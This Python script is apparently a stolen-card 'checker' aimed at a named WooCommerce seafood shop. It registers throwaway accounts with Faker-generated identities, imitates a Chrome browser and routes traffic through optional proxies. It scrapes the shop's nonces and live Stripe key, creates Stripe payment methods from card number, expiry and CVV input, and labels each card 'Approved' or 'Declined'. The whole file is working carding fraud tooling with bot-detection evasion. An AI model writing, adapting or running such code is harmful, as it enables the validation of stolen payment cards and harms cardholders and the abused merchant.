import re
import json
import random
import time
import uuid
from datetime import datetime
from faker import Faker
from curl_cffi.requests import AsyncSession

fake = Faker("en_CA")

class tools:
    @staticmethod
    def getcard(card: str) -> dict:
        parts = card.split("|")
        cc = parts[0].strip() if len(parts) > 0 else ""
        mm = parts[1].strip() if len(parts) > 1 else ""
        yy = parts[2].strip() if len(parts) > 2 else ""
        cvv = parts[3].strip() if len(parts) > 3 else ""
        
        mm = mm.zfill(2)
        
        if len(yy) == 4:
            yy = yy[-2:]
        elif len(yy) == 2:
            yy = yy
            
        return {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}


    @staticmethod
    def find_between(s: str, first: str, last: str) -> str | None:
        try:
            return s.split(first, 1)[1].split(last, 1)[0]
        except (IndexError, AttributeError):
            return None

    @staticmethod
    def userdata() -> dict:
        fn = fake.first_name()
        ln = fake.last_name()
        return {
            "name": f"{fn} {ln}",
            "first": fn,
            "last": ln,
            "address": fake.street_address(),
            "city": fake.city(),
            "state": fake.state_abbr(),
            "zip": fake.postcode(),
            "email": f"{fn.lower()}.{ln.lower()}@gmail.com",
            "phone": fake.phone_number(),
        }

    @staticmethod
    def get_card_type(cc_first: str) -> str:
        if not cc_first:
            return "visa"
        return {"3": "american-express", "5": "master-card", "6": "discover"}.get(cc_first[0], "visa")

RESPONSE_MAP = {
    "card was declined": ("Declined", "card was declined ❌", False),
    "your card could not be set up for future usage": ("Declined", "Your card could not be set up for future usage ❌", False),
    "your card number is incorrect.": ("Declined", "Your card number is incorrect. ❌", False),
    "succeeded": ("Success", "Approved - !✅", True),
}

class Gateway:
    @staticmethod
    async def charge_card(card_data: dict, user_data: dict, proxies: dict = None) -> tuple[str, str, bool]:
        async with AsyncSession(impersonate="chrome110", proxies=proxies) as session:
            try:
                # 1. GET my-account page to get registration nonce
                headers_main = {
                    "referer": "https://www.mistyharbourseafood.com/my-account/",
                }
                resp_main = await session.get(
                    "https://www.mistyharbourseafood.com/my-account/",
                    headers=headers_main,
                )
                html = resp_main.text
                reg_nonce = tools.find_between(html, 'name="woocommerce-register-nonce" value="', '"')
                if not reg_nonce:
                    return "Error", "Could not extract registration nonce", False

                # 2. Register new account
                current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                headers_register = {
                    "origin": "https://www.mistyharbourseafood.com",
                    "referer": "https://www.mistyharbourseafood.com/my-account/",
                    "content-type": "application/x-www-form-urlencoded",
                }
                data_register = {
                    "email": user_data["email"],
                    "wc_order_attribution_source_type": "typein",
                    "wc_order_attribution_referrer": "https://www.mistyharbourseafood.com/my-account/",
                    "wc_order_attribution_utm_campaign": "(none)",
                    "wc_order_attribution_utm_source": "(direct)",
                    "wc_order_attribution_utm_medium": "(none)",
                    "wc_order_attribution_utm_content": "(none)",
                    "wc_order_attribution_utm_id": "(none)",
                    "wc_order_attribution_utm_term": "(none)",
                    "wc_order_attribution_utm_source_platform": "(none)",
                    "wc_order_attribution_utm_creative_format": "(none)",
                    "wc_order_attribution_utm_marketing_tactic": "(none)",
                    "wc_order_attribution_session_entry": "https://www.mistyharbourseafood.com/my-account/",
                    "wc_order_attribution_session_start_time": current_time,
                    "wc_order_attribution_session_pages": "3",
                    "wc_order_attribution_session_count": "1",
                    "wc_order_attribution_user_agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
                    "woocommerce-register-nonce": reg_nonce,
                    "_wp_http_referer": "/my-account/",
                    "register": "Register",
                }
                await session.post(
                    "https://www.mistyharbourseafood.com/my-account/",
                    headers=headers_register,
                    data=data_register,
                )

                # 3. GET add-payment-method page to extract keys
                headers_payment = {
                    "referer": "https://www.mistyharbourseafood.com/my-account/payment-methods/",
                }
                resp_payment = await session.get(
                    "https://www.mistyharbourseafood.com/my-account/add-payment-method/",
                    headers=headers_payment,
                )
                html_payment = resp_payment.text
                pk_match = re.search(r'(pk_live_[A-Za-z0-9_-]+)', html_payment)
                if not pk_match:
                    return "Error", "Could not extract publishable key", False
                pk = pk_match.group(1)

                add_nonce = tools.find_between(html_payment, '"createSetupIntentNonce":"', '"')
                if not add_nonce:
                    return "Error", "Could not extract createSetupIntentNonce", False

                acc = tools.find_between(html_payment, '"accountId":"', '"')
                if not acc:
                    return "Error", "Could not extract accountId", False

                # 4. Get Stripe fingerprint
                headers_stripe = {
                    "origin": "https://m.stripe.network",
                    "referer": "https://m.stripe.network/",
                    "content-type": "text/plain;charset=UTF-8",
                }
                resp_stripe = await session.post("https://m.stripe.com/6", headers=headers_stripe, data={})
                stripe_data = resp_stripe.json()
                guid = stripe_data.get("guid")
                muid = stripe_data.get("muid")
                sid = stripe_data.get("sid")
                if not guid or not muid or not sid:
                    return "Error", "Missing Stripe fingerprint", False

                # 5. Create payment method via Stripe API
                client_session_id = str(uuid.uuid4())
                elements_session_config_id = str(uuid.uuid4())
                time_on_page = random.randint(10000, 99999)

                headers_pm = {
                    "origin": "https://js.stripe.com",
                    "referer": "https://js.stripe.com/",
                    "content-type": "application/x-www-form-urlencoded",
                }
                data_pm = {
                    "billing_details[name]": "",
                    "billing_details[email]": user_data["email"],
                    "billing_details[address][country]": "US",
                    "type": "card",
                    "card[number]": card_data["cc"],
                    "card[cvc]": card_data["cvv"],
                    "card[exp_year]": card_data["yy"],
                    "card[exp_month]": card_data["mm"],
                    "allow_redisplay": "unspecified",
                    "payment_user_agent": "stripe.js%2F142f43c30d%3B+stripe-js-v3%2F142f43c30d%3B+payment-element%3B+deferred-intent",
                    "referrer": "https://www.mistyharbourseafood.com",
                    "time_on_page": str(time_on_page),
                    "client_attribution_metadata[client_session_id]": client_session_id,
                    "client_attribution_metadata[merchant_integration_source]": "elements",
                    "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
                    "client_attribution_metadata[merchant_integration_version]": "2021",
                    "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
                    "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
                    "client_attribution_metadata[elements_session_id]": "elements_session_1gon18slSUi",
                    "client_attribution_metadata[elements_session_config_id]": elements_session_config_id,
                    "client_attribution_metadata[merchant_integration_additional_elements][0]": "payment",
                    "guid": guid,
                    "muid": muid,
                    "sid": sid,
                    "key": pk,
                    "_stripe_account": acc,
                }
                resp_pm = await session.post(
                    "https://api.stripe.com/v1/payment_methods",
                    headers=headers_pm,
                    data=data_pm,
                )
                pm_json = resp_pm.json()
                payment_method_id = pm_json.get("id")
                if not payment_method_id:
                    return "Error", "Failed to create Stripe payment method", False

                # 6. POST to admin-ajax to create setup intent
                headers_ajax = {
                    "origin": "https://www.mistyharbourseafood.com",
                    "referer": "https://www.mistyharbourseafood.com/my-account/add-payment-method/",
                }
                data_ajax = {
                    "action": "create_setup_intent",
                    "wcpay-payment-method": payment_method_id,
                    "_ajax_nonce": add_nonce,
                }
                resp_ajax = await session.post(
                    "https://www.mistyharbourseafood.com/wp-admin/admin-ajax.php",
                    headers=headers_ajax,
                    data=data_ajax,
                )
                response_text = resp_ajax.text.lower()

                for key, (status, msg, is_live) in RESPONSE_MAP.items():
                    if key in response_text:
                        return status, msg, is_live

                return "Unknown", "Unrecognised response ❓", False

            except Exception as e:
                return "Error", f"Exception: {str(e)}", False


async def process_ST_1(card_line: str, proxy_url: str = None) -> tuple[str, str, bool]:
    card_data = tools.getcard(card_line)
    if not card_data["cc"]:
        return "Failed", "Invalid card format", False

    user_data = tools.userdata()
    proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None

    return await Gateway.charge_card(
        card_data=card_data,
        user_data=user_data,
        proxies=proxies,
    )